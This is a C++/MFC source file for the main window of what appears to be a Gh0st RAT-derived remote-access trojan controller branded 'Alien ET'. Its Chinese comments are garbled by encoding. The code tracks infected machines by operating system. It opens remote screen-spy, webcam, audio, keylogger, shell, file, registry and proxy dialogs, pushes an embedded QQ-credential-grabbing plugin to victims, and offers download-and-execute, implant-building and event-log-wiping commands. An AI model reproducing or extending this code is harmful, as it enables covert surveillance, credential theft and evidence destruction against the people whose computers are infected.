    UINT uiGroupFind3[] = {ID_MENUITEM_FIND_PROCESS,ID_MENUITEM_FIND_WINDOW,ID_MENUITEM_CLEAN_FIND,ID_MENUITEM_OPEN_URL_HIDE,ID_MENUITEM_OPEN_URL_SHOW,ID_MENUITEM_REMARK,IDM_POPUP1,IDM_POPUP2,IDM_POPUP3,IDM_POPUP4
                           ,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST,IDM_SETCOLOR
                          };
    UINT uiGroupFind4[] = {ID_MENUITEM_CHANGE_GROUP,ID_MENUITEM_COPY_IP,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST};
    UINT uiGroupFind5[] = {ID_MENUITEM_LOCAL_UPLOAD,ID_MENUITEM_DOWNEXEC,ID_MENUITEM_UPDATE_SERVER,ID_MENUITEM_CLEANEVENT_ALL,ID_MENUITEM_CLEANEVENT_SYS,ID_MENUITEM_CLEANEVENT_SECURITY,ID_MENUITEM_CLEANEVENT_APP
                          };
    UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY};  //��־����
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU, uiGroupFind, _countof(uiGroupFind), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU3, uiGroupFind3, _countof(uiGroupFind3), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
    pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));

}
void CMainFrame::ShowConnectionsNumber()
{
    CString str,strTemp;

    int a = 0;
    CPcView* pView = NULL;
    int count = g_pTabView->m_wndTabControl.GetItemCount();
    for (int i = 0; i < count; i++) {
        pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
        a += pView->m_pListCtrl->GetItemCount();
    }

    //strTemp.Format(_T("����: %d"), a);
    strTemp.Format(_T("->(�ϼ�: %d̨)"), a);

    str.Format(_T("NT:%d Win2000:%d Xp:%d Win2003:%d Vista:%d Win2008:%d Win7:%d Win8:%d Win2012:%d Win10:%d %s"),
               nOSCount[0],
               nOSCount[1],
               nOSCount[2],
               nOSCount[3],
               nOSCount[4],
               nOSCount[5],
               nOSCount[6],
               nOSCount[7],
               nOSCount[8],
               nOSCount[9],
               strTemp);
    m_wndStatusBar.SetPaneText(0, str);

    UpdateData();

    g_pFrame->m_TrayIcon.SetTooltipText(strTemp);
}

void CMainFrame::OnCustomize()
{
    // get a pointer to the command bars object.
    CXTPCommandBars* pCommandBars = GetCommandBars();
    if (pCommandBars == NULL)
        return;

    // instanciate the customize dialog
    CXTPCustomizeSheet dlg(pCommandBars);

    // add the options page to the customize dialog.
    CXTPCustomizeOptionsPage pageOptions(&dlg);
    dlg.AddPage(&pageOptions);

    // add the commands page to the customize dialog.
    CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
    pPageCommands->AddCategories(IDR_MAINFRAME);

    // initialize the commands page page.
    pPageCommands->InsertAllCommandsCategory();
    pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
    pPageCommands->InsertNewMenuCategory();

    // display the customize dialog.
    dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
    if (nID == SC_MINIMIZE) {
        m_TrayIcon.MinimizeToTray(this);
        // m_TrayIcon.ShowBalloonTip( _T("��С��������......"), _T("Alien ET 1.0"), NIIF_NONE, 10);
    } else {
        CXTPFrameWnd::OnSysCommand(nID, lParam);
    }
}

void CMainFrame::OnMenuitemShow()
{
    // TODO: Add your command handler code here
    if (!IsWindowVisible()) {
        m_TrayIcon.MaximizeFromTray(this);
    } else
        m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide()
{
    // TODO: Add your command handler code here
    m_TrayIcon.MinimizeToTray(this);
}

// ��С��������
void CMainFrame::OnClose()
{
    // TODO: Add your message handler code here and/or call default
    m_TrayIcon.MinimizeToTray(this);
}

// �˳�����
void CMainFrame::OnExit()
{
    if (MessageBox(_T("ȷ���˳�?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
        return;

    KillTimer(0);  //�رն�ʱ��

    RECT rect;
    ::GetWindowRect(GetSafeHwnd(), &rect);
    ((CGh0stApp*)AfxGetApp())->m_IniFile.SetInt("Alien", "Width", rect.right - rect.left);
    ((CGh0stApp*)AfxGetApp())->m_IniFile.SetInt("Alien", "Hight", rect.bottom - rect.top);

    CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
    SaveCommandBars(_T("CommandBars"));
    pMainFrame->m_TrayIcon.RemoveIcon();

    if (NULL != m_iocpServer) {
        m_iocpServer->Shutdown();
        delete m_iocpServer;
    }

    CXTPFrameWnd::OnClose();
}


int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
    if (lpCreateControl->bToolBar == FALSE) {
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("��ǿ����(&I)")) {
            if (lpCreateControl->nID != IDM_POPUP1) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP1;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("�Ự����(&S)")) {
            if (lpCreateControl->nID != IDM_POPUP2) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP2;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("��������(&O)")) {
            if (lpCreateControl->nID != IDM_POPUP3) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP3;
            }
            return TRUE;
        }
        if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("������־(&C)")) {
            if (lpCreateControl->nID != IDM_POPUP4) {
                lpCreateControl->controlType = xtpControlPopup;
                lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
                lpCreateControl->nID = IDM_POPUP4;
            }
            return TRUE;
        }
        /*		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("��������(&C)"))
        		{
        			if (lpCreateControl->nID != IDM_POPUP5)
        			{
        				lpCreateControl->controlType = xtpControlPopup;
        				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
        				lpCreateControl->nID = IDM_POPUP5;
        			}
        			return TRUE;
        		}*/
    }

    return FALSE;
}


void CMainFrame::OnTools()
{
    // TODO: Add your command handler code here
    CMyToolsKit dlg;
    dlg.DoModal();
}

void CMainFrame::OnMenuitemSetting()
{
    // TODO: Add your command handler code here
    CSettingDlg dlg;
    dlg.DoModal();
}

void CMainFrame::OnMenuitemBuild()
{
    // TODO: Add your command handler code here
    CBuild dlg;
    dlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return -1;


    if (!pContext->m_bIsMainSocket) {
        // �ر���ش���
        switch (pContext->m_Dialog[0]) {
        case FILEMANAGER_DLG:
        case SCREENSPY_DLG:
        case SHELL_DLG:
        case WEBCAM_DLG:
        case AUDIO_DLG:
        case SYSTEM_DLG:
        case KEYBOARD_DLG:
        case SERVICE_DLG:
        case REGEDIT_DLG:
        case CHAT_DLG:
        case PROXYMAP_DLG:
            ((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
            break;
        default:
            break;
        }
        return 1;
    }

    CPcView* pView = NULL;
    CString strOSCount;
    int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
    bool bIsOk = false;
    for (int n = 0; n < nTabs; n++ ) {
        pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
        // ɾ����������п��ܻ�ɾ��Context
        try {
            if (pContext->m_bIsMainSocket) {
                int nCnt = pView->m_pListCtrl->GetItemCount();
                for (int i=0; i < nCnt; i++) {
                    if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i)) {
                        CString strLogText,strTemp,strGroupName;

                        strTemp = g_pTabView->m_wndTabControl.GetItem(n)->GetCaption();
                        int n = strTemp.ReverseFind('(');
                        if ( n > 0 ) {
                            strGroupName = strTemp.Left(n);
                        } else {
                            strGroupName = strTemp;
                        }

                        strLogText.Format(("��������:[%s/%s] -> ����:[%s] -> ����:[%s]"),
                                          pView->m_pListCtrl->GetItemText(i, 2),  //����IP
                                          pView->m_pListCtrl->GetItemText(i, 3),  //����IP
                                          strGroupName,  //���߷���
                                          pView->m_pListCtrl->GetItemText(i, 0));  //����λ��
                        g_pLogView->InsertLogItem( strLogText, 0, 2 );


                        bIsOk = true;
                        strOSCount = pView->m_pListCtrl->GetItemText( i, 5 );
                        if ( strOSCount.Find(_T("XP")) != -1 ) {
                            g_pFrame->nOSCount[2]--;
                        } else if ( strOSCount.Find(_T("Win 7")) != -1 ) {
                            g_pFrame->nOSCount[6]--;
                        } else if ( strOSCount.Find(_T("2003")) != -1 ) {
                            g_pFrame->nOSCount[3]--;
                        } else if ( strOSCount.Find(_T("Win 8")) != -1 ) {
                            g_pFrame->nOSCount[7]--;
                        } else if ( strOSCount.Find(_T("2008")) != -1 ) {
                            g_pFrame->nOSCount[5]--;
                        } else if ( strOSCount.Find(_T("Vista")) != -1 ) {
                            g_pFrame->nOSCount[4]--;
                        } else if ( strOSCount.Find(_T("2012")) != -1 ) {
                            g_pFrame->nOSCount[8]--;
                        } else if ( strOSCount.Find(_T("2000")) != -1 ) {
                            g_pFrame->nOSCount[1]--;
                        } else if ( strOSCount.Find(_T("NT")) != -1 ) {
                            g_pFrame->nOSCount[0]--;
                        } else if ( strOSCount.Find(_T("Win10")) != -1) {
                            g_pFrame->nOSCount[9]--;
                        }

                        pView->m_pListCtrl->DeleteItem(i);

                        if (!((CGh0stApp *)AfxGetApp())->m_bIsWarning_Tone) {
                            PlaySound(MAKEINTRESOURCE(IDR_WAVE_OFFLINE),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
                        }

                        break;
                    }
                }

                if(bIsOk == false)
                    TRACE("û���ҵ���");
            }
        } catch(...) {
            TRACE("����ʧ��");
        }
    }

    // ���µ�ǰ��������
    g_pTabView->UpDateNumber();
    ShowConnectionsNumber();

    return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;

    CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SCREENSPY_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;

    CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_FILEMANAGER, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = FILEMANAGER_DLG;
    pContext->m_Dialog[1] = (int)dlg;

    return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SHELL_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_WEBCAM, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = WEBCAM_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_SERVICE, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = SERVICE_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = AUDIO_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_KEYBOARD, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = KEYBOARD_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenChatDialog(WPARAM wParam, LPARAM lParam) // ���а�
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CMydat	*dlg = new CMydat(this, m_iocpServer, pContext);

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_CHAT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = GETDAT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;

    CPcView* pView = NULL;
    pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));

    int nCount = pView->m_pListCtrl->GetItemCount();

    for (int i=0; i < nCount; i++) {
        if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i)) {
            CString str, strTemp;

            str = pView->m_pListCtrl->GetItemText(i,3);
            int n = str.Find("*");
            if (n == 0) {
                str = str.Right(str.GetLength() - 1);
            }
            strTemp = "*";
            strTemp += str;

            pView->m_pListCtrl->SetItemText(i,3,strTemp);

            break;
        }
    }

    return 0;
}
#include "InputDlg.h"
#include "TextChatDlg.h"
LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);

    CInputDialog Indlg;
    Indlg.Init("�����������ǳ�", _T("��ȡ��Ĭ���ǳ�Ϊ(������)ET:"), this);
    if (Indlg.DoModal() != IDOK)
        dlg->strName = "ET:\r\n";
    else
        dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0));

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_TEXTCHAT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = CHAT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = SYSTEM_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //ע���
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);
    //���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = REGEDIT_DLG;
    pContext->m_Dialog[1] = (int)dlg;
    return 0;
}
#include "SelectQQ.h"
#include ".\Plugins\\C_GETQQ.h"

LRESULT CMainFrame::OnOpenQQBoxDialog(WPARAM wParam, LPARAM lParam)    //ע���
{
    ClientContext	*pContext = (ClientContext *)lParam;





    CString str = pContext->m_DeCompressionBuffer.GetBuffer(1);

    CSelectQQ dlg(str);
    if (dlg.DoModal() == IDOK) {
        /*		int nPacketLength = dlg.m_strSelect.GetLength() + 2;
        		LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
        		lpPacket[0] = COMMAND_QQBOX;
        		memcpy(lpPacket + 1, dlg.m_strSelect.GetBuffer(0), nPacketLength);

         */


        int nqqPacketLength = (GETQQMyFileSize + 1)*sizeof(char)+1 + 100;
        LPBYTE lpqqPacket = new BYTE[nqqPacketLength];
        if(lpqqPacket == NULL) {
            AfxMessageBox("��ʼ��qq���ʧ�ܣ�");
        } else {
            lpqqPacket[0] = COMMAND_QQBOX;
            memcpy(lpqqPacket + 1, dlg.m_strSelect.GetBuffer(0), 100);

            memcpy(lpqqPacket + 1 + 100, (void*)GETQQMyFileBuf, nqqPacketLength - 101);
        }


        m_iocpServer->Send(pContext,lpqqPacket, nqqPacketLength -1);
        LocalFree(lpqqPacket);
    }
    return 0;
}



LRESULT CMainFrame::OnOpenBuildDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;

    CBuild dlg;
    dlg.DoModal();

    return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
    CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);

    // ���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);

    pContext->m_Dialog[0] = PROXYMAP_DLG;
    pContext->m_Dialog[1] = (int)dlg;

    return 0;
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
    // TODO: Add your message handler code here and/or call default
    switch(nIDEvent) {
    case 0: {
        CString str1,str2;
        str1.Format("����: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024);
        str2.Format("����: %.2f kb/s", (float)m_iocpServer->m_nRecvKbps / 1024);
        m_wndStatusBar.SetPaneText(1, str1);
        m_wndStatusBar.SetPaneText(2, str2);
        m_iocpServer->m_nSendKbps = 0;
        m_iocpServer->m_nRecvKbps = 0;
    }
    break;
// 	case 1:
// 		{
//
//
// 			if (MessageBox("����ʱ�䵽����Ϊ�˲�Ӱ���û�����ʹ�ã�����ϵ����Ա���¼�ٷ�QQȺ��ͨ���߰汾��", "����", MB_OK) == IDOK)
// 			{
// 				KillTimer(0);  //�رն�ʱ��
// 				exit(0);
// 				ExitProcess(0);
// 			}
//
// 		}
// 		break;
    default:
        break;
    }

    CXTPFrameWnd::OnTimer(nIDEvent);
}

//#include ".\Plugins\\C_UpdateIP.h"
// BOOL _OpenFile()
// {
// 	char	strExePath[MAX_PATH] = {0};
//
// 	lstrcat(strExePath, "UpdateIP.EXE");
//
// 	if(GetFileAttributesA(strExePath) == 1)  //����ļ�������
// 	{
// 		ShellExecute(NULL,"open",strExePath,NULL,NULL,SW_SHOW); //��������Ŀ���ļ�
// 		return TRUE;
// 	}
//
// 	const void *filedata = (LPCTSTR)UpdateIPMyFileBuf;
// 	UINT size = UpdateIPMyFileSize;
//
// 	HANDLE	hFile =
// 		CreateFile
// 		(
// 		strExePath,
// 		GENERIC_WRITE,
// 		FILE_SHARE_WRITE,
// 		NULL,
// 		CREATE_ALWAYS,
// 		FILE_ATTRIBUTE_NORMAL,
// 		0
// 		);
//
// 	// ������
// 	if (hFile == INVALID_HANDLE_VALUE)
// 	{
// 		return false;
// 	}
//
// 	// д���ļ�
// 	DWORD	dwBytesWrite;
// 	WriteFile
// 		(
// 		hFile,
// 		filedata,
// 		size,
// 		&dwBytesWrite,
// 		NULL
// 		);
// 	CloseHandle(hFile);
//
// 	char	*lpExt = strrchr(strExePath, '.');
// 	if (!lpExt)
// 		return false;
//
// 	char BvtmX12[] = {'o','p','e','n','\0'};
// 	if(GetFileAttributesA(strExePath) == -1)  //����ļ�������
// 		return false;
//
// 	ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,SW_SHOW); //��������Ŀ���ļ�
//
// 	return false;
// }
void CMainFrame::OnMenuitemUpdateIp()
{
    // TODO: Add your command handler code here
//	_OpenFile();
    CUpdateDlg dlg;
    dlg.DoModal();



}
LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
    if (wParam == XTP_DPN_SHOWWINDOW) {
        // get a pointer to the docking pane being shown.
        CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
        if (!pPane->IsValid()) {
            CWnd* pWnd = NULL;
            if (m_mapPanes.Lookup(pPane->GetID(), pWnd)) {
                pPane->Attach(pWnd);
            }
        }

        return TRUE; // handled
    }
    return FALSE;
}
